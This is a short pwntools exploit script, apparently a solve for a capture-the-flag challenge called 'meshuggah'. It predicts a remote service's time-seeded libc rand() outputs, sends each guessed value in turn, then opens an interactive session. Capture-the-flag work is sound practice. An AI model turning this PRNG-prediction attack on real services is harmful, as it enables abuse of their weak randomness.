from pwn import *
from ctypes import CDLL
from time import *
libc = CDLL('libc.so.6')
now = int(time() + 2)
libc.srand(now)
#p = process("./meshuggah")
#p = gdb.debug("./meshuggah")
p = remote('pwn.ctf.b01lers.com',1003)
waste = libc.rand()
waste1 = libc.rand()
waste2 = libc.rand()

print waste, waste1, waste2
random_nums= []

def make_random_nums(how_many):
	for num in range(how_many):
		random_nums.append(libc.rand())

def get_first_3_instances_of_rand(r):
	print r.recvline()
	print r.recvline()
	print r.recvline()
	a = int(r.recvline()[13:], 10)
	b = int(r.recvline()[13:], 10)
	c = int(r.recvline()[13:], 10)
	print a, b, c

def exploit(r):
	raw_input("continue? ")
	make_random_nums(93)
	counter = 4
	for elem in random_nums:
		try:	
			
			print r.recvuntil("buy? ")
			r.sendline(str(elem))
			print elem, counter
			r.recvline()
			counter +=1
		except EOFError as error:
			print error
	r.interactive()




exploit(p)
